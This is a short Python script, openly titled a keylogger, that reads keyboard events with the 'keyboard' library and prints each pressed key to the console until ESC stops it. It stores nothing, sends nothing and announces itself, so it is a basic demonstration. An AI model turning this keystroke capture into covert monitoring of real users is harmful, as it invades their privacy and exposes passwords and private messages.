import keyboard

print("Keylogger started. Press ESC to stop...")

while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:
        print(f"Key pressed: {event.name}")
    if event.name == "esc":
        print("Escape pressed. Exiting...")
        break

